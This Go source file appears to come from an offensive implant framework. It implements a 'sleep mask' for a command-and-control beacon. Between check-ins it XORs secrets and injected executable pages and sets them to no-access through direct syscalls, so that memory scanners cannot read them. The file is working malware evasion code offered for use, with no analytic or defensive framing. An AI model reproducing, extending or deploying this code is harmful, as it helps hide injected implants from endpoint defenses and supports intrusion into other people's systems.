//go:build windows && amd64

// Package sleepmask obfuscates sensitive beacon memory while it sleeps
// between check-ins: key material (XORed in place — byte slices are never
// scanned by the Go GC) and owned allocations (XORed and flipped to
// PAGE_NOACCESS via direct syscalls, so memory scanners cannot read them).
// The XOR key lives on a dedicated non-heap page that is only made writable
// during mask/unmask cycles.
package sleepmask

import (
	"crypto/rand"
	"sync"
	"unsafe"

	"dark-arts/pkg/evasion"
)

const (
	pageRW  = 0x04
	pageRX  = 0x20
	pageSz  = 0x1000
	keySize = 32
)

type region struct {
	ptr  uintptr
	size uintptr
	prot uint32
}

// process-wide registrations made by other packages (e.g. injected RX
// pages); the beacon's Masker picks these up on every cycle.
var (
	defMu      sync.Mutex
	defRegions []region
	defSecrets [][]byte
)

// MaskSelfRegion registers a non-heap allocation (e.g. an injected RX page)
// with the process-wide masker so it is obfuscated during beacon sleeps.
func MaskSelfRegion(ptr, size uintptr, prot uint32) {
	defMu.Lock()
	defer defMu.Unlock()
	defRegions = append(defRegions, region{ptr: ptr, size: size, prot: prot})
}

func (m *Masker) extras() (regions []region, secrets [][]byte) {
	defMu.Lock()
	defer defMu.Unlock()
	return append([]region(nil), defRegions...), append([][]byte(nil), defSecrets...)
}

// Masker masks registered secrets and regions on Mask and restores them on
// Unmask. All methods are safe for concurrent use.
type Masker struct {
	mu      sync.Mutex
	keyPage uintptr
	secrets [][]byte
	regions []region
}

// New allocates the key page and seeds the mask key.
func New() (*Masker, error) {
	page, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, pageSz, pageRW)
	if err != nil {
		return nil, err
	}
	m := &Masker{keyPage: page}
	if _, err := rand.Read(m.key()); err != nil {
		evasion.FreeVirtualMemory(evasion.CurrentProcess, page)
		return nil, err
	}
	return m, nil
}

// Register adds a heap-resident byte slice that is XORed in place during
// Mask. The slice header and backing array must not be reallocated.
func (m *Masker) Register(buf []byte) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.secrets = append(m.secrets, buf)
}

// RegisterRegion adds a non-heap allocation (e.g. an injected RX page) that
// is XORed and flipped to PAGE_NOACCESS during Mask and restored to prot on
// Unmask. The caller must not touch the region while masked.
func (m *Masker) RegisterRegion(ptr, size uintptr, prot uint32) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.regions = append(m.regions, region{ptr: ptr, size: size, prot: prot})
}

// Mask XORs every registered buffer and region with the key and protects
// regions as PAGE_NOACCESS. Fails fast on the first syscall error; a failed
// Mask leaves everything readable (the XOR steps are only applied after the
// key page is writable, and regions are only protected after they are XORed).
func (m *Masker) Mask() error {
	m.mu.Lock()
	defer m.mu.Unlock()
	regions, secrets := m.extras()
	m.protectKey(true)
	key := m.key()
	for _, s := range m.secrets {
		xorBytes(s, key)
	}
	for _, s := range secrets {
		xorBytes(s, key)
	}
	for _, r := range m.regions {
		if err := m.protectRegion(r, key, 0x01); err != nil {
			return err
		}
	}
	for _, r := range regions {
		if err := m.protectRegion(r, key, 0x01); err != nil {
			return err
		}
	}
	m.protectKey(false)
	return nil
}

// Unmask restores everything; the inverse of Mask.
func (m *Masker) Unmask() error {
	m.mu.Lock()
	defer m.mu.Unlock()
	regions, secrets := m.extras()
	m.protectKey(true)
	key := m.key()
	for _, r := range m.regions {
		if err := m.restoreRegion(r, key); err != nil {
			return err
		}
	}
	for _, r := range regions {
		if err := m.restoreRegion(r, key); err != nil {
			return err
		}
	}
	for _, s := range m.secrets {
		xorBytes(s, key)
	}
	for _, s := range secrets {
		xorBytes(s, key)
	}
	m.protectKey(false)
	return nil
}

// protectRegion flips a region to pageRW, XORs it with the key, then applies
// the target protection.
func (m *Masker) protectRegion(r region, key []byte, to uint32) error {
	if err := m.protect(r.ptr, r.size, pageRW); err != nil {
		return err
	}
	xorRegion(r, key)
	return m.protect(r.ptr, r.size, to)
}

// restoreRegion flips a region back to pageRW, XORs it back, then restores
// its original protection.
func (m *Masker) restoreRegion(r region, key []byte) error {
	if err := m.protect(r.ptr, r.size, pageRW); err != nil {
		return err
	}
	xorRegion(r, key)
	return m.protect(r.ptr, r.size, r.prot)
}

// protectKey makes the key page writable (true) or unreadable (false).
func (m *Masker) protectKey(rw bool) {
	p := uint32(0x01)
	if rw {
		p = pageRW
	}
	_ = m.protect(m.keyPage, pageSz, p)
}

func (m *Masker) protect(ptr, size uintptr, prot uint32) error {
	_, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, ptr, size, prot)
	return err
}

func (m *Masker) key() []byte {
	return unsafeSlice(m.keyPage, keySize)
}

func xorBytes(dst, key []byte) {
	for i := range dst {
		dst[i] ^= key[i%len(key)]
	}
}

func xorRegion(r region, key []byte) {
	xorBytes(unsafeSlice(r.ptr, r.size), key)
}

func unsafeSlice(ptr, size uintptr) []byte {
	return unsafe.Slice((*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(nil))+ptr)), size)
}
